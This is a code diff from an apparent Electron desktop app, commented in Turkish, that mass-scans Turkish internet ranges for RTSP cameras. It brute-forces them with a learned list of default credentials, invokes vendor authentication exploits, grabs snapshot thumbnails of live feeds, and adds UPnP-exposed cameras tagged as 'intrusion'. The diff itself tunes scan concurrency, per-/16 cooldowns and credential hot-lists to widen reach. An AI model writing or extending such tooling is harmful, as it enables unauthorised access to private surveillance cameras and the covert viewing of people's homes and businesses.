@@ -3,6 +3,7 @@
 import { spawn } from 'child_process';
 import * as fs from 'fs';
 import * as path from 'path';
+import * as os from 'os';
 import { app } from 'electron';
 import { CameraStore, DeviceRecord, DeviceVendor, DeviceStatus } from './db';
 import { CameraRegistry, hashId, RegisteredCamera, CamProtocol } from './registry';
@@ -15,6 +16,7 @@ import { StreamEngine } from './stream';
 import { hikvisionLogin, dahuaLogin, hikvisionChannelCount, dahuaChannelCount } from './vendor-auth';
 import { discoverStreams } from './channels';
 import { scrapePublic } from './public-scrapers';
+import { upnpCameraUrls } from './upnp';
 import { GeoLocator } from './geoip';
 import { scanPort, quickRtsp, rtspAlive, rtspBanner, rtspVendor, MASS_CREDS } from './massscan';
 import { tryProprietaryAuth, dahuaRtspPath, hikRtspPath } from './proprietary';
@@ -312,14 +314,21 @@ export async function runHealthCheck(
 export async function runThumbnails(store: CameraStore): Promise<number> {
   const live = store.listDevices('LIVE');
   let n = 0;
-  for (const d of live) {
-    const url = d.url || `rtsp://${d.ip}:${d.port}/`;
-    const jpeg = await snapshotJpeg(url);
-    if (jpeg && jpeg.length > 500) {
-      store.saveThumb(d.id, jpeg);
-      n++;
+  let idx = 0;
+  // E: SINIRLI havuz (4 eşzamanlı) + nefes payı → ana tarama döngüsünü kilitlemez.
+  const workers = Array.from({ length: Math.min(4, Math.max(live.length, 1)) }, async () => {
+    while (idx < live.length) {
+      const d = live[idx++];
+      const url = d.url || `rtsp://${d.ip}:${d.port}/`;
+      const jpeg = await snapshotJpeg(url);
+      if (jpeg && jpeg.length > 500) {
+        store.saveThumb(d.id, jpeg);
+        n++;
+      }
+      await new Promise((r) => setTimeout(r, 150));
     }
-  }
+  });
+  await Promise.all(workers);
   return n;
 }
 
@@ -333,7 +342,19 @@ export async function runMassScan(
     .listDevices()
     .filter((d) => d.status === 'LIVE' || d.status === 'ACCESSIBLE')
     .map((d) => d.ip);
-  const q = await buildScanQueue(hitIps);
+  // C: /16 tarama sayaçları (kalıcı) — boş aralık cooldown'ı için.
+  const scanCounts = new Map<number, number>();
+  try {
+    const raw = store.getMeta('p16-scan');
+    if (raw) {
+      for (const [k, v] of Object.entries(JSON.parse(raw) as Record<string, number>)) {
+        scanCounts.set(Number(k), Number(v));
+      }
+    }
+  } catch {
+    /* fresh */
+  }
+  const q = await buildScanQueue(hitIps, scanCounts);
   // Kuyruk şeması değişti (TR-only) → eski cursor geçersiz, baştan başla.
   const QUEUE_VER = 'tr-v3';
   if (store.getMeta('queue-ver') !== QUEUE_VER) {
@@ -382,10 +403,17 @@ export async function runMassScan(
 
   // RTSP portları: 554 + alternatifler. SIRAYLA, 3000 eşzamanlı.
   // (Paralel 4 port × 2000 = 8000 socket OS/ISP'de düşüyordu → sahte "az bulundu".)
+  // ÖĞRENİLMİŞ global kimlik hot-list — her cihazda ilk bunlar denenir (A maddesi).
+  const hotCreds = store.topCreds(24);
+
+  // KAYNAK EŞİĞİ (D): bellek darsa eşzamanlılığı otomatik düşür (donma/takılma önler).
+  const freeRatio = os.freemem() / Math.max(os.totalmem(), 1);
+  const rtspConc = freeRatio < 0.12 ? 700 : freeRatio < 0.25 ? 1100 : 1500;
+
   const RTSP_PORTS = [554, 8554, 10554, 1554];
   const openTargets: { ip: string; port: number }[] = [];
   for (const p of RTSP_PORTS) {
-    const hits = await scanPort(ips, p, 1500, 900);
+    const hits = await scanPort(ips, p, rtspConc, 900);
     // TCP-open yetmez — RTSP konuşanları doğrula (ISP NAT/yalan portları ele).
     let vi = 0;
     const vworkers = Array.from({ length: Math.min(150, Math.max(hits.length, 1)) }, async () => {
@@ -426,13 +454,13 @@ export async function runMassScan(
       const lon = geo?.lon || 0;
 
       const id = hashId(`rtsp://${ip}:${port}`);
-      let qr = await quickRtsp(ip, port);
+      let qr = await quickRtsp(ip, port, 2000, hotCreds);
       if (!qr) {
         // InternetDB (ücretsiz, anahtarsız): bu IP'nin DİĞER açık RTSP portlarını dene.
         const idb = await internetDb(ip);
         for (const p of idb?.ports || []) {
           if (p !== port && (p === 554 || p === 8554 || p === 10554 || p === 1554)) {
-            const alt = await quickRtsp(ip, p);
+            const alt = await quickRtsp(ip, p, 2000, hotCreds);
             if (alt) {
               qr = alt;
               break;
@@ -502,6 +530,24 @@ export async function runMassScan(
   live += cveLive + propLive;
 
   store.setMeta('scan-cursor', JSON.stringify(q.getPosition()));
+  // C: bu batch'in /16'larını say (boş prefix cooldown'ı öğrenir).
+  try {
+    const seen16 = new Set<number>();
+    for (const ip of ips) {
+      const p = ip.split('.').map(Number);
+      if (p.length === 4) seen16.add(((p[0] << 8) | p[1]) >>> 0);
+    }
+    for (const k of seen16) scanCounts.set(k, (scanCounts.get(k) || 0) + 1);
+    if (scanCounts.size > 30000) {
+      const top = [...scanCounts.entries()].sort((a, b) => b[1] - a[1]).slice(0, 30000);
+      scanCounts.clear();
+      for (const [k, v] of top) scanCounts.set(k, v);
+    }
+    store.setMeta('p16-scan', JSON.stringify(Object.fromEntries(scanCounts)));
+  } catch {
+    /* noop */
+  }
+
   // Kanıt: her döngü telemetrisi (userData/scan.log) — gerçekten tarandığının izi.
   try {
     fs.appendFileSync(
@@ -792,6 +838,29 @@ export async function runVendorAuthExploit(store: CameraStore, registry: CameraR
 
 export async function runPublicScrape(registry: CameraRegistry): Promise<number> {
   const cams = await scrapePublic();
+  // F: UPnP IGD ile dışa açılmış kameralar (modem port yönlendirmesi).
+  try {
+    for (const url of await upnpCameraUrls()) {
+      const id = hashId(url);
+      if (registry.get(id)) continue;
+      cams.push({
+        id,
+        name: `UPnP ${url.replace(/^https?:\/\//, '').slice(0, 40)}`,
+        il: 'yerel',
+        ilce: 'upnp',
+        lat: 0,
+        lon: 0,
+        protocol: url.startsWith('rtsp') ? 'rtsp' : 'http',
+        url,
+        status: 'unknown',
+        source: 'intrusion',
+        lastSeen: Date.now(),
+        latencyMs: null,
+      });
+    }
+  } catch {
+    /* UPnP yok → sorun değil */
+  }
   let added = 0;
   for (const c of cams) {
     if (!registry.get(c.id)) {
